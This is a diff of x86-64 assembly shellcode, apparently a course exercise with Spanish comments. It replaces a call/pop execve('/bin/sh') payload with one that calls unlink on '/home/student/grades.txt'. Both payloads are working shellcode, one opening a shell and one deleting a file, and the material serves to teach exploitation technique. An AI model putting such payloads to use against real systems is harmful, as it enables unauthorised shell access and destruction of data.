@@ -1,34 +1,37 @@
 #include <sys/syscall.h>
 
-#define STRING	"/bin/sh"
-#define STRLEN	7
-#define ARGV	(STRLEN+1)
-#define ENVP	(ARGV+8)
+/* Shellcode que invoca unlink("/home/student/grades.txt")
+ * Ejercicio 3: reemplaza el execve("/bin/sh") original.
+ *
+ * Técnica call/pop para obtener la dirección del string sin usar
+ * posiciones absolutas (position-independent shellcode).
+ */
+
+#define STRING  "/home/student/grades.txt"
+#define STRLEN  24          /* longitud del string sin null terminator */
 
 .globl main
-	.type	main, @function
+.type main, @function
 
- main:
-	jmp	calladdr
+main:
+    jmp calladdr            /* saltamos al call para obtener la dir del string */
 
- popladdr:
-	popq	%rcx
-	movq	%rcx,(ARGV)(%rcx)	/* set up argv pointer to pathname */
-	xorq	%rax,%rax		/* get a 64-bit zero value */
-	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
-	movq	%rax,(ENVP)(%rcx)	/* set up null envp */
+popladdr:
+    popq    %rcx            /* %rcx = dirección del inicio del string */
 
-	movb	$SYS_execve,%al		/* set up the syscall number */
-	movq	%rcx,%rdi		/* syscall arg 1: string pathname */
-	leaq	ARGV(%rcx),%rsi		/* syscall arg 2: argv */
-	leaq	ENVP(%rcx),%rdx		/* syscall arg 3: envp */
-	syscall				/* invoke syscall */
+    xorq    %rax, %rax      /* rax = 0 */
+    movb    %al, STRLEN(%rcx)   /* null-terminar el string en rcx[24] */
 
-	xorq	%rax,%rax		/* get a 64-bit zero value */
-	movb    $SYS_exit,%al		/* set up the syscall number */
-	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
-	syscall				/* invoke syscall */
+    movb    $SYS_unlink, %al    /* número de syscall: unlink = 87 */
+    movq    %rcx, %rdi          /* arg1 = puntero al pathname */
+    syscall                     /* unlink("/home/student/grades.txt") */
 
- calladdr:
-	call	popladdr
-	.ascii	STRING
+    /* exit limpio */
+    xorq    %rax, %rax
+    movb    $SYS_exit, %al      /* syscall exit = 60 */
+    xorq    %rdi, %rdi          /* exit code 0 */
+    syscall
+
+calladdr:
+    call    popladdr            /* push addr del siguiente byte en stack, luego salta */
+    .ascii  STRING              /* el string vive aquí; popladdr hace pop de esta dirección */
